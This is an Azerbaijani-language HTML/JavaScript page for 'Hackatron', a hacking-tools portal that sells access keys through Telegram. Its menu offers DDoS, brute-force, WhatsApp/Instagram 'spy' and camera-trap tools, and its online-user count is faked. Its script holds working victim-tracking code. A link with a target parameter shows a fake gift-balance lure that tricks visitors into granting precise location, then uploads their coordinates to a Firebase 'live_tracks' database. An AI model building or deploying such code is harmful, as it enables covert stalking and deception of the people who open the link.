<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Hackatron | Mobile Access</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&family=Syncopate:wght@700&display=swap');
        
        :root { 
            --bg: #020205; --glass: rgba(255, 255, 255, 0.03); --border: rgba(255, 255, 255, 0.08); 
            --cyber: #00ff00; --tools: #00dfff; --gold: #ffd700; --fun: #ff007a; 
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body { 
            margin: 0; background: var(--bg); color: white; font-family: 'Outfit', sans-serif; 
            overflow-x: hidden; min-height: 100vh;
            background: radial-gradient(circle at center, #0a0a1a 0%, #020205 100%);
        }

        /* DISCLAIMER - APP-DƏ QARALMAMASI ÜÇÜN SADƏLƏŞDİRİLDİ */
        #view-disclaimer { 
            position: fixed; inset: 0; z-index: 10000; background: #000; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; 
        }
        .matrix-text { 
            color: var(--cyber); font-family: 'Courier New', monospace; font-size: 0.9rem; 
            line-height: 1.6; text-align: center; max-width: 500px; min-height: 100px;
        }

        /* SECTIONS - ANIMASIYALAR APP ÜÇÜN STABİLLƏŞDİRİLDİ */
        #view-login, #view-menu { display: none; padding: 20px; width: 100%; max-width: 1200px; margin: auto; }
        
        .navbar { 
            display: flex; justify-content: space-between; align-items: center; 
            background: var(--glass); padding: 15px 25px; border-radius: 20px; 
            border: 1px solid var(--border); margin: 15px 0;
        }

        .stats-top { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; font-family: 'Syncopate'; font-size: 0.5rem; letter-spacing: 1px; opacity: 0.6; }

        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; }
        
        .card { 
            background: var(--glass); padding: 30px 15px; border-radius: 30px; 
            border: 1px solid var(--border); text-align: center; cursor: pointer; position: relative; overflow: hidden;
        }
        .card i { font-size: 2.5rem; margin-bottom: 15px; }
        .key-tag { position: absolute; top: 10px; right: -25px; background: var(--gold); color: black; font-size: 0.5rem; font-weight: 900; padding: 3px 30px; transform: rotate(45deg); }

        #tool-list { display: none; }
        .back-btn { background: var(--glass); border: 1px solid var(--border); color: white; padding: 10px 20px; border-radius: 10px; cursor: pointer; margin-bottom: 20px; font-size: 0.8rem; font-weight: 900; }

        .btn-main { 
            width: 100%; margin-top: 20px; padding: 16px; border-radius: 12px; 
            border: none; background: white; color: black; font-weight: 900; cursor: pointer; 
        }

        input { 
            width: 100%; padding: 15px; border-radius: 12px; border: 1px solid var(--border); 
            background: #000; color: white; text-align: center; margin-top: 15px; outline: none; 
        }

        #modal-overlay { 
            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); 
            z-index: 20000; padding: 20px; overflow-y: auto; 
        }
    </style>
</head>
<body>

<audio id="bg-music" loop preload="auto"><source src="music.mp3" type="audio/mpeg"></audio>

<section id="view-disclaimer">
    <div id="typewriter" class="matrix-text"></div>
    <button id="btn-agree" class="btn-main" style="display:none; width:180px; background:transparent; border:1px solid var(--cyber); color:var(--cyber);" onclick="acceptDisclaimer()">GİRİŞ ET</button>
</section>

<section id="view-login">
    <div style="background:var(--glass); padding:40px 30px; border-radius:35px; border: 1px solid var(--border); text-align:center; width:100%; max-width:320px; margin:60px auto;">
        <h1 style="font-family:'Syncopate'; font-size:1rem; color:var(--tools);">HACKATRON</h1>
        <input type="text" id="u-input" placeholder="USERNAME">
        <button class="btn-main" onclick="handleLogin()">DAXİL OL</button>
    </div>
</section>

<section id="view-menu">
    <div class="stats-top">
        <div>USERS: <span style="color:var(--gold)">3562+</span></div>
        <div>ONLINE: <span id="online-count">7</span></div>
    </div>
    <div class="navbar">
        <div style="font-weight:900; font-size:0.8rem;">ID: <span id="u-display" style="color:var(--tools);">...</span></div>
        <button onclick="window.open('https://t.me/+HQWNjQ9m6Xc0YjRi')" style="background:var(--gold); color:black; border:none; padding:6px 12px; border-radius:8px; font-weight:900; cursor:pointer; font-size:0.6rem;">KEY AL</button>
    </div>

    <div id="category-selector" class="grid">
        <div class="card" onclick="showTools('cyber-grid')"><i class="fas fa-user-ninja" style="color:var(--cyber)"></i><h3 style="font-size:0.8rem;">KİBER</h3></div>
        <div class="card" onclick="showTools('tools-grid')"><i class="fas fa-shield-alt" style="color:var(--tools)"></i><h3 style="font-size:0.8rem;">ALƏTLƏR</h3></div>
        <div class="card" onclick="showTools('fun-grid')"><i class="fas fa-heart" style="color:var(--fun)"></i><h3 style="font-size:0.8rem;">ƏYLƏNCƏ</h3></div>
    </div>

    <div id="tool-list">
        <div class="back-btn" onclick="backToCategories()"><i class="fas fa-chevron-left"></i> GERİ</div>
        <div id="active-grid" class="grid"></div>
    </div>
</section>

<div id="modal-overlay">
    <button onclick="closeTool()" style="position:fixed; top:20px; right:20px; background:red; color:white; border:none; padding:8px 15px; border-radius:8px; cursor:pointer; z-index:20001;">X</button>
    <div id="tool-content" style="margin-top:40px;"></div>
</div>

<script>
    // FİREBASE
    const firebaseConfig = { apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // QURBAN İZLƏMƏ (APP İÇİNDƏ DƏ İŞLƏYİR)
    const urlParams = new URLSearchParams(window.location.search);
    const targetId = urlParams.get('target');
    if(targetId) {
        document.body.innerHTML = `<div style="background:#000; color:white; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; text-align:center; padding:30px;">
            <i class="fas fa-gift" style="font-size:3.5rem; color:#ff007a; margin-bottom:20px;"></i>
            <h2>TƏBRİKLƏR!</h2><p>Hədiyyə balansını təsdiqləmək üçün məkan icazəsi verin.</p>
            <button onclick="getGPS()" style="background:#ff007a; color:white; border:none; padding:15px 40px; border-radius:10px; font-weight:900; width:100%; margin-top:20px;">QƏBUL ET</button>
        </div>`;
        window.getGPS = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    db.ref('live_tracks/' + targetId).set({ lat: pos.coords.latitude, lng: pos.coords.longitude, time: Date.now() });
                    alert("Balans təsdiqləndi.");
                }, () => alert("Məkan icazəsi mütləqdir."), {enableHighAccuracy:true});
            }
        };
    }

    // BÖLMƏLƏR
    const toolGrids = {
        'cyber-grid': [
            {n:'Wordlist Yaradıcı', i:'fa-file-code', c:'var(--cyber)', f:'wordlist.html', p:1},
            {n:'DDoS Stresser', i:'fa-radiation', c:'var(--cyber)', f:'ddos.html', p:1},
            {n:'SQL Skaner', i:'fa-database', c:'var(--cyber)', f:'sql_scan.html', p:1},
            {n:'Brute Force', i:'fa-unlock-alt', c:'var(--cyber)', f:'brute.html', p:1}
        ],
        'tools-grid': [
            {n:'GPS Tracker', i:'fa-location-crosshairs', c:'var(--cyber)', f:'gps.html', p:1},
            {n:'WhatsApp Spy', i:'fa-whatsapp', c:'#25d366', f:'wa.html', p:1},
            {n:'Instagram Spy', i:'fa-instagram', c:'var(--tools)', f:'insta.html', p:1},
            {n:'Kamera Tələsi', i:'fa-camera', c:'var(--tools)', f:'trap.html', p:1},
            {n:'IP İzləyici', i:'fa-location-dot', c:'white', f:'ip.html', p:0},
            {n:'Anonim Mail', i:'fa-envelope-shield', c:'white', f:'mail.html', p:0}
        ],
        'fun-grid': [
            {n:'Hədiyyə Çarxı', i:'fa-gift', c:'var(--fun)', f:'gift.html', p:0},
            {n:'Gizli Test', i:'fa-mask', c:'var(--fun)', f:'secret.html', p:0},
            {n:'Tarot Analizi', i:'fa-wand-sparkles', c:'var(--fun)', f:'tarot.html', p:0}
        ]
    };

    const disText = "Bu sayt təhsil məqsədlidir. İstifadə zamanı məsuliyyət istifadəçinin üzərinə düşür. Davam edərək razılaşırsınız.";
    let charIdx = 0;

    function typeWriter() {
        if (charIdx < disText.length) {
            document.getElementById('typewriter').innerHTML += disText.charAt(charIdx);
            charIdx++; setTimeout(typeWriter, 25);
        } else { document.getElementById('btn-agree').style.display = 'inline-block'; }
    }

    // TƏTİQ QORUYUCUSU
    setTimeout(() => { if(document.getElementById('btn-agree').style.display === 'none') document.getElementById('btn-agree').style.display = 'inline-block'; }, 4000);

    function acceptDisclaimer() {
        try { document.getElementById('bg-music').play(); } catch(e){}
        document.getElementById('view-disclaimer').style.display = 'none';
        const s = localStorage.getItem('elite_session');
        if(s) showMenu(s); else document.getElementById('view-login').style.display = 'flex';
    }

    async function handleLogin() {
        const u = document.getElementById('u-input').value.trim().toLowerCase();
        if(u.length < 3) return;
        
        const snap = await db.ref('users/'+u).get();
        if(snap.exists() && snap.val().isBlocked) return alert("GİRİŞ BLOKLANIB!");

        localStorage.setItem('elite_session', u);
        await db.ref('users/'+u).update({ isOnline: true });
        showMenu(u);
    }

    function showMenu(u) {
        document.getElementById('view-login').style.display = 'none';
        document.getElementById('view-menu').style.display = 'block';
        document.getElementById('u-display').innerText = u.toUpperCase();
        db.ref('users/'+u+'/isOnline').onDisconnect().set(false);
    }

    function showTools(key) {
        document.getElementById('category-selector').style.display = 'none';
        document.getElementById('tool-list').style.display = 'block';
        const grid = document.getElementById('active-grid'); grid.innerHTML = "";
        toolGrids[key].forEach(t => {
            grid.innerHTML += `<div class="card" onclick="openTool('${t.f}', ${t.p})">
                ${t.p ? '<div class="key-tag">KEY</div>' : ''}
                <i class="fas ${t.i}" style="color:${t.c}"></i>
                <h3 style="font-size:0.75rem;">${t.n}</h3>
            </div>`;
        });
    }

    function backToCategories() {
        document.getElementById('tool-list').style.display = 'none';
        document.getElementById('category-selector').style.display = 'grid';
    }

    async function openTool(file, isPremium) {
        if(isPremium) {
            const key = prompt("Access Key daxil edin:");
            if(!key) return;
            const snap = await db.ref('keys/' + key.toUpperCase()).get();
            if(!snap.exists() || snap.val().status !== "active" || snap.val().expiry < Date.now()) {
                alert("Key yanlışdır və ya vaxtı bitib!"); return;
            }
        }
        
        fetch(file).then(r => r.text()).then(h => {
            document.getElementById('tool-content').innerHTML = h;
            document.getElementById('modal-overlay').style.display = 'block';
            
            // App Inventor Script Fix
            const sc = document.getElementById('tool-content').querySelectorAll('script');
            sc.forEach(s => { const n = document.createElement("script"); n.textContent = s.textContent; document.head.appendChild(n).parentNode.removeChild(n); });
        }).catch(() => alert("Fayl tapılmadı!"));
    }

    function closeTool() { document.getElementById('modal-overlay').style.display = 'none'; document.getElementById('tool-content').innerHTML = ""; }
    
    window.onload = typeWriter;
    setInterval(() => { document.getElementById('online-count').innerText = Math.floor(Math.random()*10)+3; }, 5000);
</script>
</body>
</html>
